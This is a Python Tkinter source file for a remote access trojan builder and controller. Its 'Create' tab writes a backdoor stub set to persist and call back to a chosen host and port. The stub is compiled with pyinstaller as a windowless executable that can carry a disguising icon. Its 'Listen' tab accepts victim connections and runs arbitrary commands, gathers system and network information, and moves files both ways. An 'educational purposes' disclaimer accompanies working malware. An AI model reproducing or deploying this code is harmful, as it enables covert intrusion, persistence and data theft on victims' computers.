import subprocess
import os
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox as m_box
from tkinter import filedialog
import time
import socket, json, base64, webbrowser, sys


class Listener:
    def __init__(self):
        root=tk.Tk()
        root.title("listenter frontend")
        root.geometry("950x650")

        # list of logo
        if sys.platform.startswith("win"):
            linux_logo = tk.PhotoImage(file="content\\linux.png")
            mac_logo = tk.PhotoImage(file="content\\mac.png")
            window_logo = tk.PhotoImage(file="content\\win.png")
            myself_logo = tk.PhotoImage(file="content\\myself.png")
        else:
            linux_logo = tk.PhotoImage(file="content/linux.png")
            mac_logo = tk.PhotoImage(file="content/mac.png")
            window_logo = tk.PhotoImage(file="content/win.png")
            myself_logo = tk.PhotoImage(file="content/myself.png")

        #list of variables used in the entire program
        self.lhost=tk.StringVar() # for storing the lhost
        self.llhost=tk.StringVar() # for storing the lhost
        self.lport=tk.StringVar() # for storing the port no.
        self.llport=tk.IntVar() # for storing the port no.
        self.os=tk.StringVar()  # for store which os
        self.output=tk.StringVar() # for storing the output path in entry box
        self.iconpath=tk.StringVar()#for storing the path of icon
        self.lcommand=tk.StringVar()

        #menubar
        self.tabs=ttk.Notebook(root)
        self.create_tab=ttk.Frame(self.tabs)
        self.listen_tab=ttk.Frame(self.tabs)
        self.about_tab=ttk.Frame(self.tabs)
        self.tabs.add(self.create_tab,text="Create")
        self.tabs.add(self.listen_tab,text="Listen")
        self.tabs.add(self.about_tab,text="About")
        self.tabs.pack(expand=True,fill='both')

        # list of frame to hold the logo
        frame_linux_logo = tk.Frame(self.create_tab, width=102, height=102, background="white")
        frame_linux_logo.pack_propagate(0)
        frame_linux_logo.place(x=410,y=230)
        tk.Label(frame_linux_logo,image=linux_logo).pack()

        # for about section
        frame_myself_logo = tk.Frame(self.about_tab, width=200, height=200, background="white")
        frame_myself_logo.pack_propagate(0)
        frame_myself_logo.place(x=375,y=50)
        tk.Label(frame_myself_logo,image=myself_logo).pack()

        frame_window_logo = tk.Frame(self.create_tab, width=102, height=102, background='white')
        frame_window_logo.pack_propagate(0)
        frame_window_logo.place(x=220,y=230)
        tk.Label(frame_window_logo,image=window_logo).pack()

        frame_mac_logo = tk.Frame(self.create_tab, width=102, height=102, background='white')
        frame_mac_logo.pack_propagate(0)
        frame_mac_logo.place(x=600,y=230)
        tk.Label(frame_mac_logo,image=mac_logo).pack()

        # frame for  the output
        frame_output = tk.Frame(self.listen_tab, width=900, height=400, background='white')
        frame_output.pack_propagate(0)
        frame_output.place(x=25,y=150)

        # Scrollbar
        horizontal_scrollbar = ttk.Scrollbar(frame_output, orient = 'horizontal')
        horizontal_scrollbar.pack(side = tk.BOTTOM, fill = tk.X)
        verticle_scrollbar = ttk.Scrollbar(frame_output)
        verticle_scrollbar.pack(side = tk.RIGHT, fill = tk.Y)

        # textfiled where the output will be printed
        self.output_textfield = tk.Text(frame_output, width = 900, height = 400, wrap = tk.NONE,xscrollcommand = horizontal_scrollbar.set,yscrollcommand = verticle_scrollbar.set)
        self.output_textfield.configure(state=tk.DISABLED)

        self.output_textfield.pack(side=tk.TOP, fill=tk.X)
        horizontal_scrollbar.config(command=self.output_textfield.xview)
        verticle_scrollbar.config(command=self.output_textfield.yview)


        #all label
        # for create tab

        #lhost label
        self.lhost_label=ttk.Label(self.create_tab,text="LHOST : ")
        self.lhost_label.place(x=250,y=60)

        #lport label
        self.lport_label=ttk.Label(self.create_tab,text="LPORT : ")
        self.lport_label.place(x=250,y=110)

        # chose os
        self.select_os_label = ttk.Label(self.create_tab,text="- - - - - -   Choose The Operating System   - - - - - - ")
        self.select_os_label.place(x=300,y=180)

        #icon label
        self.iconpath_label = ttk.Label(self.create_tab, text="Icon Path : ")
        self.iconpath_label.place(x=250,y=400)

        #output path label
        self.output_path_label = ttk.Label(self.create_tab, text="Output Name : ")
        self.output_path_label.place(x=250,y=450)

        # end of labling in create tab
        # label for listen tab
        # lhost label
        self.lhost_label=ttk.Label(self.listen_tab,text="LHOST : ")
        self.lhost_label.place(x=40,y=20)

        #lport label
        self.lport_label=ttk.Label(self.listen_tab,text="LPORT : ")
        self.lport_label.place(x=450,y=20)

        # output
        self.output_label = ttk.Label(self.listen_tab,text="OUTPUT :-")
        self.output_label.place(x=30, y=120)
        # end of the labling in listen tab

        #all enter box for create tab
        #lhost enter box
        self.lhost_entry = ttk.Entry(self.create_tab,width=30,textvariable=self.lhost)
        self.lhost_entry.place(x=400,y=60)

        #lport entry box
        self.lport_entry=ttk.Entry(self.create_tab,width=30,textvariable=self.lport)
        self.lport_entry.place(x=400,y=110)

        #icon path entry box
        self.iconpath_entry = ttk.Entry(self.create_tab,textvariable=self.iconpath,width=20,state=tk.DISABLED)
        self.iconpath_entry.place(x=400,y=400)

        #output path entry box
        self.output_path_entry = ttk.Entry(self.create_tab,width=30,textvariable=self.output)
        self.output_path_entry.place(x=400,y=450)
        # end of the entry box in create tab
        # all entry box for listen tab
        # lhost entry box
        self.lhost_entry = ttk.Entry(self.listen_tab,width=30,textvariable=self.llhost)
        self.lhost_entry.place(x=105,y=20)

        #lport entry box
        self.lport_entry=ttk.Entry(self.listen_tab,width=30,textvariable=self.llport)
        self.lport_entry.place(x=515,y=20)

        # start listen button
        self.listen_btn = ttk.Button(self.listen_tab,text="Start Listening",command=self.listen_btn_task)
        self.listen_btn.place(x=800,y=17)

        #button for create tab
        # create button
        self.create_btn=tk.Button(self.create_tab,text="CREATE PAYLOAD",command=self.create_btn_task,width=30)
        self.create_btn.place(x=330,y=520)

        #select file button
        self.select_file_btn = ttk.Button(self.create_tab,text="Select file",command=self.browse_file_method)
        self.select_file_btn.place(x=600,y=396)

        #radio button for os selection
        self.os_selection_windows =  ttk.Radiobutton(self.create_tab, text="Windows",variable=self.os,value="windows")
        self.os_selection_windows.place(x=230,y=350)

        self.os_selection_linux = ttk.Radiobutton(self.create_tab, text="Linux",variable=self.os, value="linux")
        self.os_selection_linux.place(x=430,y=350)

        self.os_selection_mac = ttk.Radiobutton(self.create_tab, text="Mac",variable=self.os, value="mac")
        self.os_selection_mac.place(x=630,y=350)
        # end the button for create tab
        #about the developer
        self.about_label=ttk.Label(self.about_tab,text="I am MOHAMMAD ALTAF HUSSAIN. The Developer of this tool. I have created \nthis only for Educational purposes. So as a respected the privary of others and don't\nuse it for illegal work. I love to IMPLEMENT of what i have LEARN.\n\t\tWhen i was a beginner i had suffer from lot of issue in order to \nachieve the goal, At that time  there was a very few tool which have GUI. At that time, \ni used to think when i have sufficient knowledge i will create a platform where are \nthings are available with GUI. As a result i have create this tool. Although i am still \nlearning and i will continue to develop such tools.")
        self.about_label.place(x=200,y=300)
        #find me on github
        find_me_on_github = ttk.Label(self.about_tab,text="Follow me on github : ")
        find_me_on_github.place(x=200,y=480)
        self.enable_secure_app=ttk.Label(self.about_tab,foreground="blue",cursor="hand2",text = "https://www.github.com/altaf7740"                                                                                                                                                           )
        self.enable_secure_app.place(x=400,y=480)
        self.enable_secure_app.bind("<Button-1>", lambda e: self.callback("https://www.github.com/altaf7740"))
        #find me on linkedin
        find_me_on_linkedin = ttk.Label(self.about_tab,text="Follow me on linkedin : ")
        find_me_on_linkedin.place(x=200,y=450)
        self.enable_secure_app=ttk.Label(self.about_tab,foreground="blue",cursor="hand2",text = "https://www.linkedin.com/in/altaf7740"                                                                                                                                                           )
        self.enable_secure_app.place(x=400,y=450)
        self.enable_secure_app.bind("<Button-1>", lambda e: self.callback("https://www.linkedin.com/in/altaf7740"))
        thanks = ttk.Label(self.about_tab,text="THANK YOU FOR USING THIS APP :)\n\n     ***** HAPPY HACKING *****")
        thanks.place(x=350,y=550)


        root.mainloop()

    def callback(self,url):
        webbrowser.open_new(url)

    def browse_file_method(self):
        self.iconpath_entry.config(state=tk.NORMAL)
        filename = tk.filedialog.askopenfilename(initialdir = "~", title= "select file",filetypes = (("icon files","*.ico"),("",""))) #("all files","*.*")
        self.iconpath_entry.delete(0,tk.END)
        self.iconpath_entry.insert(0,filename)
        self.iconpath_entry.config(state=tk.DISABLED)

    def upload_file_method(self):
        self.iconpath_entry.config(state=tk.NORMAL)
        filename = tk.filedialog.askopenfilename(initialdir = "~", title= "select file",filetypes = (("all files","*.*"),("",""))) #("all files","*.*")
        output_to_print = self.run(str(f"upload {filename}"))
        self.display_output(str(f"{output_to_print}\n\n┌─[{self.nodename}@{self.current_user_login}]─[{self.current_working_directory}]\n└──╼$ "))
        self.output_textfield.yview(tk.END)



    def compile_for_windows(self, file_name):
        if self.iconpath:
            subprocess.call(["pyinstaller", "--onefile", "--noconsole", "--icon", self.iconpath.get(), file_name],stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        else:
            subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name],stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


    def compile_for_linux(self, file_name):
        subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

    def create_payload(self):
        with open(self.output.get(), "w+") as file:
            file.write("import backdoor\n")
            file.write("mybackdoor = backdoor.Backdoor('" + str(self.lhost.get()) + "'"+ "," + self.lport.get() + ")\n")
            file.write("mybackdoor.become_persistent()\n")
            file.write("mybackdoor.run()\n")

    def everything_is_ok_in_create_tab(self):
        if not self.lhost.get():
            m_box.showerror("error","please sepcify lhost")
            return False
        if not self.lport.get():
            m_box.showerror("erro","please sepcify lport")
            return False
        if not self.os.get():
            m_box.showerror("erro","please sepcify the operating system")
            return False
        if not self.output.get():
            m_box.showerror("erro","please sepcify the output name")
            return False
        return True

    def create_btn_task(self):
        if self.everything_is_ok_in_create_tab():
            ttk.Label(self.create_tab,text=".........  Please wait  .........").place(x=380,y=560)
            self.progressbar=ttk.Progressbar(self.create_tab,orient=tk.HORIZONTAL,length=930, mode = 'determinate')
            self.progressbar.place(x=10,y=600)
            self.create_payload()

            # just to increase the progressbar
            self.progressbar['value']=10
            self.create_tab.update_idletasks()
            time.sleep(1)
            self.progressbar['value']=40
            self.create_tab.update_idletasks()
            time.sleep(1)
            self.progressbar['value']=60
            self.create_tab.update_idletasks()
            if self.os.get() == "windows":
                self.compile_for_windows(self.output.get())
            if self.os.get() == "linux":
                self.compile_for_linux(self.output.get())

            self.progressbar['value']=90
            self.create_tab.update_idletasks()
            time.sleep(1)
            self.progressbar['value']=100
            self.create_tab.update_idletasks()

            m_box.showinfo("success","file created  and Successfully Saved")

    def system_info_method(self):
        output_to_print = self.run("systeminfo")
        self.display_output(output_to_print)
        self.display_output(str(f"\n\n┌─[{self.nodename}@{self.current_user_login}]─[{self.current_working_directory}]\n└──╼$ "))
        self.output_textfield.yview(tk.END)


    def network_info_method(self):
        output_to_print =   "\n\n[+] List Of Available Interface And Their Details\n"
        output_to_print += self.run("network_info")
        self.display_output(output_to_print)
        self.display_output(str(f"\n\n┌─[{self.nodename}@{self.current_user_login}]─[{self.current_working_directory}]\n└──╼$ "))
        self.output_textfield.yview(tk.END)

    def download_btn_task(self):
        self.display_output("\n[!] In order to download file, type 'download [path/to/filename]'\n\nfor example :  \n\ndownload lol.jpg\ndownlaod /home/user/lol.jpg \n\n[!] If the target is a window user then type: \n\ndownload \\Desktop\\lol.jpg")

    def add_widget(self):
        # button for listen tab
        # System info button
        self.system_info_button = ttk.Button(self.listen_tab,text="Get System Info",command=self.system_info_method)
        self.system_info_button.place(x=25,y=75)

        # Network Info button
        self.network_info_button = ttk.Button(self.listen_tab,text="Get Network Info",command=self.network_info_method)
        self.network_info_button.place(x=190,y=75)

        # upload file button
        self.upload_file_button = ttk.Button(self.listen_tab,text="Upload File",command=self.upload_file_method)
        self.upload_file_button.place(x=370,y=75)

        # download file button
        self.download_file_button = ttk.Button(self.listen_tab,text="Download File",command=self.download_btn_task)
        self.download_file_button.place(x=520,y=75)

        # take close connection button
        self.close_connection_button = ttk.Button(self.listen_tab,text="Close Connection",command=self.close_connection_task)
        self.close_connection_button.place(x=680,y=75)

        # help button
        self.clear_console_button = ttk.Button(self.listen_tab,text="Clear Console",command=self.clear_console_method)
        self.clear_console_button.place(x=840,y=75)

        # execute button
        self.execute_button = tk.Button(self.listen_tab,text="Execute",command=self.execute_button_task)
        self.execute_button.place(x=842,y=577)

        # entrybox
        #system command entry box
        self.execute_command_entry=ttk.Entry(self.listen_tab,width=100,textvariable=self.lcommand)
        self.execute_command_entry.place(x=25,y=580)

    def write_file(self, path, content):
        with open(path.split('/')[-1], "wb")as file:
            file.write(base64.b64decode(content.encode()))
            return "[+] file downloaded successfully"



    def execute_on_target_machine(self, command):
        self.relaible_send(command)
        if command[0]=="exit":
            self.connection.close()
            exit()
        decoded_output = self.reliable_recieve()
        return decoded_output

    def relaible_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                temp_json_data = self.connection.recv(1024)
                json_data = json_data + temp_json_data.decode()
                return json.loads(json_data)
            except json.decoder.JSONDecodeError:
                continue

    def read_file(self,path):
        with open(path, "rb")as file:
            return base64.b64encode(file.read())



    def display_output(self,printable):
        self.output_textfield.configure(state=tk.NORMAL)
        self.output_textfield.insert(tk.END,f"{printable}")
        self.output_textfield.configure(state=tk.DISABLED)

    def run(self,command):
        command = command.split(" ")
        try:
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content.decode())

            result = self.execute_on_target_machine(command)

            if command[0] == "download":
                result = self.write_file(command[1], result)
        except Exception:
            result = "[-] error during command execution"
        return result

    def everything_is_ok_in_listen_tab(self):
        if not self.llhost.get():
            m_box.showerror("error","please specify lhost")
            return False
        if not self.llport.get():
            m_box.showerror("error","please specify lport")
            return False
        return True

    def listen_btn_task(self):
        if self.everything_is_ok_in_listen_tab():
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((self.llhost.get(),self.llport.get()))
            listener.listen(0)
            self.display_output("[+] waiting for connection ....")
            m_box.showinfo("press ok to continue","Waiting for the connection")
            self.connection, self.address = listener.accept()
            self.display_output(f"\n[+] got a connection from {self.address[0]}")
            self.lhost_entry.config(state = tk.DISABLED)
            self.lport_entry.config(state = tk.DISABLED)
            self.add_widget()
            self.listen_btn.config(state=tk.DISABLED)
            self.execute_command_entry.focus()
            self.execute_command_entry.bind("<Return>",(lambda event: self.execute_button_task()))
            self.nodename = self.run("nodename")
            self.current_user_login = self.run("userinfo")
            self.current_working_directory = self.run("cwd")
            self.display_output(str(f"\n\n┌─[{self.nodename}@{self.current_user_login}]─[{self.current_working_directory}]\n└──╼$ "))

    def close_connection_task(self):
        self.execute_on_target_machine("exit".split(' '))

    def clear_console_method(self):
        self.output_textfield.config(state=tk.NORMAL)
        self.output_textfield.delete('1.0', tk.END)
        self.display_output(str(f"┌─[{self.nodename}@{self.current_user_login}]─[{self.current_working_directory}]\n└──╼$ "))
        self.output_textfield.config(state=tk.DISABLED)

    def execute_button_task(self):
        if str(self.lcommand.get()) == "clear":
            self.clear_console_method()

        else:
            output_to_print = self.run(str(self.lcommand.get()))
            if str(self.lcommand.get()).split(" ")[0] == "cd":
                self.current_working_directory = self.run("cwd")
                print(self.current_working_directory)
            self.display_output(str(f"{self.lcommand.get()}\n{output_to_print}\n\n┌─[{self.nodename}@{self.current_user_login}]─[{self.current_working_directory}]\n└──╼$ "))
            self.output_textfield.yview(tk.END)
        self.execute_command_entry.delete(0, 'end')

def main():
    print("Note that by using this software, if you ever see the creator of '8u7!N07!c3', you should (optional) give him a hug and should (optional) buy him a bourbon. Author has the option to refuse the hug and borbon (most likely will never happen)\n\n\nThe tool '8u7!N07!c3'  is designed purely for good and not evil. \nIf you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, \nyou are violating the terms of service and license of this toolset\nBy hitting yes, \nyou agree to the terms of service and that you will only use this tool for lawful purposes only.\n\nDo you agree to the terms of service [y/n]:  ",end="")
    user_answer = input("")
    if user_answer == 'y' or user_answer == 'Y' or user_answer == 'yes' or user_answer == 'YES' or user_answer=='Yes':
        obj=Listener()
        obj.execute_on_target_machine("exit".split(' '))
    else:
        print("okay, get lost !!!")

if __name__ == "__main__":
    main()
